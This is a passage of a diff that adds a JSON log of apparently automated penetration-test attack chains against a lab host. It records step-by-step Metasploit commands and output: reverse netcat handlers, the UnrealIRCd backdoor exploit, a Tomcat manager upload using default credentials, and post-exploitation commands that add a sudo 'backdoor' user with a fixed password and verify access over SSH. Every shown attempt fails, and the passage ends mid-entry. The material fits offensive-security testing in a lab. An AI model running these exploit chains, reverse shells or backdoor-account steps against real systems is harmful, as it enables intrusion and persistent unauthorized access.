+                    "failure_reason": "Session does not exist"
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "<close_session operation>",
+                    "command_type": "close_session",
+                    "raw_output": "Session 'samba_session' closed",
+                    "analysis": "Type: close_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'whoami'",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\nPermission denied, please try again.\r\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 5,
+                    "failure_reason": "SSH connection failed"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 4: UnrealIRCd Backdoor RCE": {
+            "initial_access": [
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'irc_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "use exploit/multi/handler",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set LHOST 192.168.56.1",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set LPORT 4446",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "run -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set RPORT 6667",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 6667\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 6667\nset PAYLOAD cmd/unix/reverse_netcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4446:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4446\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_n\netcat\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set LHOST 192.168.56.1",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 6667\nset PAYLOAD cmd/unix/reverse_netcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4446:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4446\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_n\netcat\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1\n[!] Unknown datastore option: LHOST. Did you mean RHOST?\nLHOST => 192.168.56.1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "set LPORT 4446",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 6667\nset PAYLOAD cmd/unix/reverse_netcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4446:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4446\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_n\netcat\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1\n[!] Unknown datastore option: LHOST. Did you mean RHOST?\nLHOST => 192.168.56.1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 6667\nset PAYLOAD cmd/unix/reverse_netcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4446:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4446\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_n\netcat\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1\n[!] Unknown datastore option: LHOST. Did you mean RHOST?\nLHOST => 192.168.56.1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -j\n[-] 192.168.56.5:6667 - Exploit failed: A payload has not been selected.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                },
+                {
+                    "description": "Set up reverse handler and exploit IRC backdoor for reverse shell",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 6667\nset PAYLOAD cmd/unix/reverse_netcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4446:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4446\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_n\netcat\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1\n[!] Unknown datastore option: LHOST. Did you mean RHOST?\nLHOST => 192.168.56.1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -j\n[-] 192.168.56.5:6667 - Exploit failed: A payload has not been selected.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Exploit failed",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit failed"
+                }
+            ],
+            "post_exploitation": [
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sessions -i 1 -c 'useradd -m -G sudo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4446\nLPORT => 4446\nmsf exploit(multi/handler) > run -j\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.5\nset RPORT 6667\nset PAYLOAD cmd/unix/reverse_netcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/handler) >\n[-] Handler failed to bind to 192.168.56.1:4446:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4446\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667\nRPORT => 6667\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_n\netcat\n[-] The value specified for PAYLOAD is not valid.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1\n[!] Unknown datastore option: LHOST. Did you mean RHOST?\nLHOST => 192.168.56.1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4446\n[!] Unknown datastore option: LPORT. Did you mean RPORT?\nLPORT => 4446\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -j\n[-] 192.168.56.5:6667 - Exploit failed: A payload has not been selected.\n[*] Exploit completed, but no session was created.\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -l\n\nActive sessions\n===============\n\nNo active sessions.\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -i 1 -c 'useradd -m -\nG sudo backdoor -s /bin/bash; echo backdoor:backdoorpass | chpasswd'\n[-] Invalid session identifier: 1\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) >\n",
+                    "analysis": "Type: session_command. FAILED - Session does not exist",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Session does not exist"
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "<close_session operation>",
+                    "command_type": "close_session",
+                    "raw_output": "Session 'irc_session' closed",
+                    "analysis": "Type: close_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Create persistent backdoor user via root shell and verify SSH access",
+                    "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'whoami'",
+                    "command_type": "regular",
+                    "raw_output": "Warning: Permanently added '192.168.56.5' (RSA) to the list of known hosts.\r\nPermission denied, please try again.\r\n",
+                    "analysis": "Type: regular. FAILED - SSH connection failed",
+                    "status": "error",
+                    "return_code": 5,
+                    "failure_reason": "SSH connection failed"
+                }
+            ],
+            "overall_status": "partial",
+            "furthest_stage": "initial_access",
+            "notes": []
+        },
+        "Chain 5: Tomcat Manager Upload RCE": {
+            "initial_access": [
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'tomcat_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "use exploit/multi/handler",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set LHOST 192.168.56.1",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set LPORT 4447",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "run -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "use exploit/multi/http/tomcat_mgr_upload",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set RHOSTS 192.168.56.5",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set RPORT 8180",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set USERNAME tomcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\n\n\n\n\n",
+                    "analysis": "Type: session_command. FAILED - Exploit ran but failed to open a session",
+                    "status": "error",
+                    "return_code": 0,
+                    "failure_reason": "Exploit ran but failed to open a session"
+                },
+                {
+                    "description": "Set up reverse handler and exploit Tomcat manager for reverse shell",
+                    "command": "set PASSWORD tomcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/handler\nmsf > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf exploit(multi/handler) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/handler) > set LHOST 192.168.56.1\nLHOST => 192.168.56.1\nmsf exploit(multi/handler) > set LPORT 4447\nLPORT => 4447\nmsf exploit(multi/handler) > run -j\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS 192.168.56.5\nset RPORT 8180\nset USERNAME tomcat\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[-] Handler failed to bind to 192.168.56.1:4447:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4447\nmsf exploit(multi/handler) > use exploit/multi/http/tomcat_mgr_upload\nset PASSWORD tomcat\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nmsf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.56.5\nRHOSTS => 192.168.56.5\nmsf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180\nRPORT => 8180\nmsf exploit(multi/http/tomcat_mgr_upload) > set USERNAME tomcat\n[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?\nUSERNAME => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) > set PASSWORD tomcat\n[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?\nPASSWORD => tomcat\nmsf exploit(multi/http/tomcat_mgr_upload) >\n",
